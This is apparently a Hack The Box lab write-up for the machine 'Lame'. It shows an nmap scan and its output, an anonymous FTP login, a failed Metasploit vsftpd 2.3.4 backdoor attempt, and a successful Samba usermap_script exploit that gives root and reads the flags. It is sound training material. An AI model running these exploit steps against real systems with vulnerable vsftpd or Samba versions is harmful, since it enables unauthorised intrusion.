# Lame

IP: `10.10.10.3`

## Initial recon

### First scan the port

```sh
nmap -A -T5 -p- 10.10.10.3
```

### Result from scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 03:15 EDT
Nmap scan report for 10.10.10.3
Host is up (0.073s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   71.71 ms 10.10.14.1
2   71.86 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.29 seconds
```

### Result interpretation

First, let's look at the FTP anonymous login portion. We *could* try to login and see if we can get anything from the files inside the FTP share. But first, let's find any existing exploits for that specific FTP version.

0. We can try accessing the FTP share anonymously to see if there's aynthing in there
1. A quick google search for `ftp         vsftpd 2.3.4 exploit` yields a rapid7 exploit.
2. Another attack we can try is on the SAMBA

## Logging into the FTP server

```sh
ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:omar2535): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```
It gave us nothing. So there's not much to see inside this FTP share. Let's try digging a bit deeper though.

## Using the VSFTPD_234 backdoor

### Metasploit exploit run

```sh
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show targets
msf exploit(vsftpd_234_backdoor) > set TARGET 0
msf exploit(vsftpd_234_backdoor) > show options
msf exploit(vsftpd_234_backdoor) > run
# [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 10.10.10.3:21 - USER: 331 Please specify the password.
# [*] Exploit completed, but no session was created.
```

Annnnnd a dead end. It won't give us back a session. A quick google search shows that some people suggest using netcat to create a hook for the session, but I have a feeling that the solution is easier than that, so let's the next method, SAMBA.

## Using Samba usermap script

### Metasplot exploit run

```sh
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
msf exploit(usermap_script) > set TARGET 0
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > run
```

And now we have a shell!

### Digging around

```sh
whoami
# root
pwd
# /
cd ~
cat root.txt # for flag for root
cd /home/makis
cat user.txt # for flag for user
```

## Takeaways

1. Don't dig too deep into the rabbit hole, try other easier methods before coming back
2. Note all possible vulnerabilities to attack so that if one method fails, other methods can be used as backup